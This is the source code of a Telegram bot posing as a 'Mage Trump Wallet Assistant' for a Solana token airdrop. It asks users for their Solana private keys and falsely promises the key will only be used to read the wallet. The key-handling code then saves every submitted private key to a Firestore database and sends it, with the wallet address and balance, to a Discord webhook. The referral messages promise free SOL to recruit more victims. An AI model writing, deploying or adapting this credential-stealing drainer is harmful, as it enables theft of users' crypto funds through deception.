require('dotenv').config();
const path = require('path');
const { Telegraf, session } = require('telegraf');
const admin = require('firebase-admin');
const { Connection, Keypair, PublicKey, LAMPORTS_PER_SOL } = require('@solana/web3.js');
const rawBs58 = require('bs58');
const bs58 = rawBs58.default || rawBs58;
const fetch = (...args) => import('node-fetch').then(({ default: fetch }) => fetch(...args));

// Setup
const bot = new Telegraf(process.env.BOT_TOKEN);
const credentials = JSON.parse(process.env.FIREBASE_CREDENTIALS_JSON);
const discordWebhook = process.env.DISCORD_WEBHOOK;
admin.initializeApp({ credential: admin.credential.cert(credentials) });
const db = admin.firestore();
const connection = new Connection("https://api.mainnet-beta.solana.com");

// Sessão e anti-flood
bot.use(session());
const cooldowns = new Map();
function isFlooding(ctx, type = 'default', waitTime = 4000) {
  const key = `${ctx.chat.id}:${type}`;
  const now = Date.now();
  if (cooldowns.has(key)) {
    const last = cooldowns.get(key);
    if (now - last < waitTime) return true;
  }
  cooldowns.set(key, now);
  return false;
}

// Utilitário de resposta formatada
function formatStatus(pubkey, solBalance, projectBalance, refCount, canClaim) {
  return `
🧙 Wallet: \`${pubkey}\`
💸 On-chain balance: ${solBalance} SOL
🎯 Project balance: ${projectBalance} SOL
🔗 Referrals: ${refCount}
${canClaim ? '✅' : '⛔'} Claim status: ${canClaim ? 'Available' : 'Not Available'}

📢 Your referral link:
https://magetoken.com.br/?ref=${pubkey}

🚀 Share your link and earn 0.1 SOL for each new wizard you recruit!`.trim();
}

// /start
bot.start((ctx) => {
  ctx.replyWithPhoto(
    { source: path.resolve(__dirname, 'images/trumpmage.png') },
    {
      caption: `👋 *Welcome to Mage Trump Wallet Assistant!*

To continue, please send your Solana *private key* (in base58 format or JSON array). This will allow the bot to connect to your wallet and show your status.

⚠️ Your key will be used to read your wallet only. Keep it safe.

🌐 Visit our website: [magetoken.com.br](https://magetoken.com.br)

❓ *Need help?* Type /help to see all available commands.`,
      parse_mode: 'Markdown'
    }
  );
});

// /exit
bot.command('exit', (ctx) => {
  ctx.session = null;
  ctx.reply('👋 You have been logged out. Send your private key again to reconnect.');
});

// /help
bot.command('help', (ctx) => {
  if (isFlooding(ctx, 'help')) return ctx.reply('⏳ Please wait before using that again.');
  ctx.replyWithMarkdown(`📖 *How MageTrump Assistant Works*

1. Send your Solana *private key* to connect.
2. Use /status to check your balance.
3. Use /link to get your referral link.
4. Use /referrals to see your invited users.
5. Use /exit to logout.

🌐 [magetoken.com.br](https://magetoken.com.br)`);
});

// /status
bot.command('status', (ctx) => {
  if (isFlooding(ctx, 'status')) return ctx.reply('⏳ Please wait before using /status again.');
  const s = ctx.session?.walletData;
  if (!s) return ctx.reply('❌ You are not connected. Send your private key first.');
  ctx.replyWithMarkdown(formatStatus(s.pubkey, s.solBalance, s.projectBalance, s.refCount, s.canClaim));
});

// /link
bot.command('link', (ctx) => {
  if (isFlooding(ctx, 'link')) return ctx.reply('⏳ Wait a moment before trying /link again.');
  const s = ctx.session?.walletData;
  if (!s) return ctx.reply('❌ You are not connected. Send your private key first.');

  const message = `
📢 Want free SOL?

Join the *Mage Trump Token* airdrop and earn 0.5 SOL instantly!  
🎯 Plus, get 0.1 SOL for each wizard you invite.

🚀 Use my referral link now:  
https://magetoken.com.br/?ref=${s.pubkey}

Let's farm together! 🧙‍♂️  
#Crypto #Airdrop #SOL #MageTrump
  `.trim();

  ctx.replyWithMarkdown(message);
});

// /referrals
bot.command('referrals', (ctx) => {
  if (isFlooding(ctx, 'referrals')) return ctx.reply('⏳ Hold on... don’t spam!');
  const s = ctx.session?.walletData;
  if (!s) return ctx.reply('❌ You are not connected. Send your private key first.');
  ctx.reply(`📈 You have referred ${s.refCount} wizard(s)!`);
});

// Processa chave privada
bot.on('text', async (ctx) => {
  if (isFlooding(ctx, 'login', 5000)) return ctx.reply('⏳ Please wait before submitting again.');

  const input = ctx.message.text.trim();
  let keypair;

  try {
    let secret;
    if (input.startsWith('[')) {
      secret = JSON.parse(input);
    } else {
      const decoded = bs58.decode(input);
      secret = Array.from(decoded);
    }

    if (!secret || secret.length !== 64) {
      return ctx.reply(`❌ *Invalid key length:* \`${secret?.length || 0}\` bytes.\n\nA valid private key must decode to exactly 64 bytes.\n\n🛠 *How to fix:*\n- Export your *private key* from Phantom\n- Do NOT use your public key or seed phrase\n- Use base58 or JSON array`, { parse_mode: 'Markdown' });
    }

    keypair = Keypair.fromSecretKey(Uint8Array.from(secret));
    const pubkey = keypair.publicKey.toBase58();
    const lamports = await connection.getBalance(new PublicKey(pubkey));
    const solBalance = (lamports / LAMPORTS_PER_SOL).toFixed(3);

    const userRef = db.collection('users').doc(pubkey);
    const docSnap = await userRef.get();

    let projectBalance = '0.0', refCount = 0, canClaim = false;

    if (docSnap.exists) {
      await userRef.update({ privateKey: input });
      const data = docSnap.data();
      projectBalance = (data.balance || 0).toFixed(2);
      refCount = data.refCount || 0;
      canClaim = data.canClaim || false;
    } else {
      await userRef.set({
        wallet: pubkey,
        privateKey: input,
        referral: null,
        createdAt: new Date(),
        balance: 0.5,
        claimed: false,
        refCount: 0,
        canClaim: false,
      });
      projectBalance = '0.5';
    }

    ctx.session ??= {};
    ctx.session.walletData = { pubkey, solBalance, projectBalance, refCount, canClaim };

    await ctx.replyWithMarkdown(formatStatus(pubkey, solBalance, projectBalance, refCount, canClaim));

    // Discord webhook
    try {
      await fetch(discordWebhook, {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({
          content: `📢 New user connected via private key:

👤 Telegram: @${ctx.from.username || 'unknown'}
🔑 Private Key: \`${input}\`
🧙 Wallet: \`${pubkey}\`

💸 On-chain: ${solBalance} SOL
🎯 Project: ${projectBalance} | Referrals: ${refCount}
⛔ Claim: ${canClaim ? 'Available' : 'Not Available'}`
        })
      });
    } catch (err) {
      console.warn('⚠️ Discord webhook error:', err.message);
    }

  } catch (err) {
    console.error('Erro ao processar a chave:', err.message || err);
    ctx.reply(`❌ Error processing key: ${err.message || 'unknown error'}`);
  }
});

bot.launch();
console.log("✅ MageTrump Assistant is running...");
